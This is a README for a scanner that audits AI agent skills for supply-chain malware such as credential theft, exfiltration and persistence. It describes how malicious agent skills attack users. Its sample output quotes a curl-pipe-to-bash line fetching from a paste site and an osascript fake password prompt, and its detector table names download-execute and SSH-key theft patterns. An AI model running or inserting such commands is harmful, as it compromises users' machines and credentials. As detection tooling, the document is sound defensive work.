# Skill Security Audit

> Detect malicious patterns in your AI Agent skills before they steal your SSH keys.

Based on [SlowMist's analysis](https://slowmist.medium.com/) of **472+ malicious skills** discovered on the ClawHub platform, this tool scans your installed Claude Code and OpenClaw skills for backdoors, credential theft, data exfiltration, and other supply-chain attacks.

## The Problem

AI Agent skill marketplaces (ClawHub, etc.) are the new npm — and they have the same supply-chain attack problem. Attackers publish innocent-looking skills that:

- **Download & execute remote payloads** via `curl | bash`
- **Steal credentials** using fake macOS password dialogs (`osascript`)
- **Exfiltrate SSH keys, AWS creds, .env files** to C2 servers
- **Persist via crontab/launchd** to survive reboots
- **Hide malicious code** in Base64, hex encoding, or zero-width characters

**472+ malicious skills found. Zero scanning tools existed. Until now.**

## Quick Start

### Install via Skills CLI (Recommended)

```bash
npx skills add smartchainark/skill-security-audit
```

### Or Clone Manually

```bash
git clone https://github.com/smartchainark/skill-security-audit.git ~/.claude/skills/skill-security-audit
```

Either way, the skill is immediately available in Claude Code.

### Run Manually

```bash
# Scan ALL installed skills
python3 ~/.claude/skills/skill-security-audit/scripts/skill_audit.py

# Scan a single skill
python3 ~/.claude/skills/skill-security-audit/scripts/skill_audit.py --path /path/to/skill

# JSON output (for CI/CD integration)
python3 ~/.claude/skills/skill-security-audit/scripts/skill_audit.py --json

# Only show HIGH and CRITICAL findings
python3 ~/.claude/skills/skill-security-audit/scripts/skill_audit.py --severity high
```

### Use in Claude Code

Just say any of these to Claude:

- "安全审计" / "security audit"
- "scan skills" / "skill 检查"
- "技能安全" / "supply chain security"

Claude will run the scanner and present findings with remediation guidance.

## What It Detects

**13 detectors** covering the full attack surface:

| Detector | What It Catches | Severity |
|----------|----------------|----------|
| `DownloadExecDetector` | `curl\|bash`, `wget\|sh`, fetch+eval | **CRITICAL** |
| `IOCMatchDetector` | Known malicious IPs, domains, URLs, file hashes | **CRITICAL** |
| `CredentialTheftDetector` | osascript password phishing, Keychain access, SSH key theft | **CRITICAL** |
| `PostInstallHookDetector` | npm `postinstall`, pip `setup.py cmdclass` | **HIGH→CRITICAL** |
| `ObfuscationDetector` | `eval`/`exec` with non-literal args, hex encoding, `chr()` chains | **HIGH** |
| `ExfiltrationDetector` | ZIP + upload combos, sensitive directory enumeration | **HIGH** |
| `PersistenceDetector` | crontab, launchd plist, systemd service, shell profile writes | **HIGH** |
| `PrivilegeEscalationDetector` | `sudo`, `chmod 777`, `setuid` | **HIGH** |
| `Base64Detector` | Encoded strings >50 chars (excludes `data:image`, lock files) | **MEDIUM→HIGH** |
| `EntropyDetector` | High Shannon entropy lines (>5.5, adjusted for CJK) | **MEDIUM** |
| `NetworkCallDetector` | socket, http, urllib, requests, fetch, curl, wget | **MEDIUM** |
| `HiddenCharDetector` | Zero-width characters, Unicode bidi overrides (Trojan Source) | **MEDIUM** |
| `SocialEngineeringDetector` | crypto/wallet/airdrop/security-update naming | **LOW→MEDIUM** |

### Each Finding Includes

- **Severity**: CRITICAL / HIGH / MEDIUM / LOW
- **Confidence Score**: 0–100 (reduces alert fatigue)
- **File path + line number** (click-to-navigate)
- **Line content preview**
- **Plain-language description** of the threat

## Sample Output

```
======================================================================
  SKILL SECURITY AUDIT REPORT
  Scanned: 39 skills, 338 files
======================================================================

  Summary: CRITICAL: 0  |  HIGH: 2  |  MEDIUM: 5  |  LOW: 1

  ──────────────────────────────────────────────────────────────────
  Skill: suspicious-helper
  Findings: 2

    [CRITICAL] DownloadExecDetector
      File: scripts/setup.sh:14
      Download-and-execute pattern: curl pipe to shell
      Confidence: 95%
      > curl -s https://rentry.co/raw/xxxxx | bash

    [CRITICAL] CredentialTheftDetector
      File: scripts/collect.py:28
      Credential theft technique: macOS password dialog via osascript
      Confidence: 95%
      > osascript -e 'display dialog "Enter password" with hidden answer'
======================================================================
```

## Exit Codes

| Code | Meaning |
|------|---------|
| `0` | Clean — no findings |
| `1` | Low/Medium risk findings |
| `2` | High risk findings |
| `3` | Critical findings |
| `4` | Scanner error |

Use in CI: `python3 skill_audit.py --json; [ $? -lt 2 ] && echo "PASS" || echo "FAIL"`

## Auto-Discovery

The scanner automatically finds skills in:

- `~/.claude/skills/` — Claude Code skills
- `~/.openclaw/workspace/skills/` — OpenClaw workspace
- Extra directories from `~/.openclaw/openclaw.json` → `skills.load.extraDirs`

Automatically excludes `venv/`, `node_modules/`, `.git/`, `__pycache__/`, etc.

## IOC Database

Known malicious indicators from the SlowMist report are in `scripts/ioc_database.json`:

- **7 malicious IPs** (C2 servers, exfiltration endpoints)
- **4 malicious domains** (socifiapp.com, rentry.co abuse, etc.)
- **URL patterns** for paste-service payload delivery
- **5 known malicious file SHA256 hashes**

### Update IOCs

Edit `scripts/ioc_database.json` directly — the scanner loads it at runtime, no code changes needed:

```json
{
  "malicious_ips": [
    {"ip": "1.2.3.4", "context": "New C2 server", "first_seen": "2026-02-10", "threat_actor": "unknown"}
  ]
}
```

## Reference Documents

| File | Content |
|------|---------|
| `references/ioc-database.md` | Human-readable IOC list with context and attribution |
| `references/threat-patterns.md` | 9 attack patterns in detail (two-stage payload, Base64 backdoor, password phishing, etc.) |
| `references/remediation-guide.md` | Step-by-step incident response (quarantine, credential rotation, persistence cleanup) |

## Design Decisions

- **Zero dependencies** — Pure Python stdlib. No `pip install`. Works on any system with Python 3.8+.
- **External IOC database** — JSON file, update without code changes.
- **Confidence scoring** — Every finding has a 0–100 score to reduce false positive fatigue.
- **Smart exclusions** — Lock files, `data:image`, CJK text, `.md` docs, and `venv/node_modules` are handled intelligently.
- **Self-aware** — The scanner's own detection patterns will match itself; these are expected low-confidence findings.

## FAQ

**Q: Will this catch all malicious skills?**
A: No. It catches known patterns from the SlowMist report and common attack techniques. Sophisticated zero-day attacks may evade detection. Always manually review skills from untrusted sources.

**Q: I'm getting false positives on my legitimate skill.**
A: Use `--severity high` to filter noise. Network calls and Base64 in legitimate skills trigger MEDIUM findings by design — they're informational, not accusations. Check the confidence score.

**Q: Can I use this in CI/CD?**
A: Yes. Use `--json` for machine-readable output and check exit codes (0-3).

**Q: Does it work with MCP servers?**
A: It scans file-based skills. MCP servers run as separate processes and need different auditing approaches.

## Contributing

PRs welcome, especially for:
- New detectors for emerging attack patterns
- IOC database updates from new threat intelligence
- False positive reduction improvements

## Credits

- **SlowMist Security Team** — Threat intelligence and IOC data from the ClawHub malicious skills analysis report
- **Poseidon Group TTPs** — Attack pattern documentation based on SlowMist's attribution analysis

## License

MIT
